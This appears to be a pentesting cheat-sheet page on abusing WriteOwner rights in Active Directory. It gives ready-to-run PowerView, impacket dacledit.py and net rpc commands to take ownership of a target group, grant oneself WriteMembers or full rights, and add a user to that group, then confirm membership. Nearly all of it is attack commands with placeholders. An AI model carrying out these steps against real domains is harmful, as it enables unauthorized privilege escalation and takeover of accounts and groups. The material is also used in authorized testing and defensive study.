---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
---

### Abuse #1 : Change owner of the group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1

<div>

```console
. .\PowerView.ps1
```

</div>

#### 2. Change owner

<div>

```console
Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
```

</div>

{{< /tabcontent >}}

### Abuse #2 : Add user to the group

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 0. Install latest impacket (included dacledit.py)

<div>

```console
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
pip3 install .
```

</div>

#### 1. Add domain object

<div>

```console
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers
```

</div>

#### 2. Add group member

<div>

```console
kinit <USER>
```

```console
sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

</div>

#### 3. Check

<div>

```console
sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

<div>

```console
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Add user to group

<div>

```console
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```console
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

</div>

#### Check

<div>

```console
Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```console
# Or
net user <USER>
```

```console
# Exit current sessions or re-login
whoami /groups
```

</div>

{{< /tabcontent >}}

<br>